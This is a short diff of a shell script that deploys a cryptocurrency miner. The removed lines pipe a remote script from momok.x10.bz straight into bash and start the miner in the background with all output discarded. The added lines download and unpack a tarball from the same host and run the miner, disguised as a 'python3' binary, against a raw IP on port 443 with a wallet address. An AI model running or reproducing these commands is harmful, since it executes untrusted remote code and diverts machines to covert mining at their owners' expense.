@@ -1,7 +1,5 @@
-apt install screen -y
+wget -O DOT momok.x10.bz/DOT-CPU.tar.gz
 
-bash -c "$(wget -qO- momok.x10.bz/Alat-Coli-SRB.sh)"
+tar -xvf DOT
 
-screen ./dotsrb/python3 -a yespowersugar -o yespowerSUGAR.sea.mine.zpool.ca:6241 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB > /dev/null 2>&1 &
-
-sleep 5
+./dotcpu/python3 -a yespowersugar -o 45.115.225.210:443 -u DDNAURzgPGuWuLb1joXcKTA7iMydnXaTXK -p c=DGB
